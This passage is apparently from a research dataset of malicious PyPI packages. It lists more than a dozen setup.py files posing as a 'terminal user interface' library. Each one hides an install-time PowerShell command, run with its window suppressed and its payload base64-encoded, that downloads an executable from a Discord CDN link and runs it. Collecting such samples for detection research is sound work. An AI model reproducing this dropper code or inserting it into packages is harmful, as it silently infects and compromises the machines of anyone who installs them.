author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfrandcraftreplace-v7.5",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrandcraftreplace',\n    packages = ['modlib'],\n    version = '9.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfrandloadcv-v9.47",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrandloadcv',\n    packages = ['modlib'],\n    version = '7.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfrandomintosint-v10.62",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrandomintosint',\n    packages = ['modlib'],\n    version = '6.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfrandompostint-v10.75",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrandompostint',\n    packages = ['modlib'],\n    version = '6.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfrekillrand-v2.6",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrekillrand',\n    packages = ['modlib'],\n    version = '5.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfrepaypalhttp-v8.54",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrepaypalhttp',\n    packages = ['modlib'],\n    version = '5.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfreplaceencodepush-v4.93",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfreplaceencodepush',\n    packages = ['modlib'],\n    version = '2.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-librehackedpull-v6.60",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librehackedpull',\n    packages = ['modlib'],\n    version = '10.33',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfedrandomrandom-v3.53",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfedrandomrandom',\n    packages = ['modlib'],\n    version = '8.48',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfloadcvencode-v9.93",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfloadcvencode',\n    packages = ['modlib'],\n    version = '10.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfsplitreplacecraft-v9.37",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfsplitreplacecraft',\n    packages = ['modlib'],\n    version = '10.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfvirtualreosint-v3.13",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvirtualreosint',\n    packages = ['modlib'],\n    version = '10.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpedhydrapush-v7.40",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpedhydrapush',\n    packages = ['modlib'],\n    version = '8.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfstrultrapush-v4.57",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstrultrapush',\n    packages = 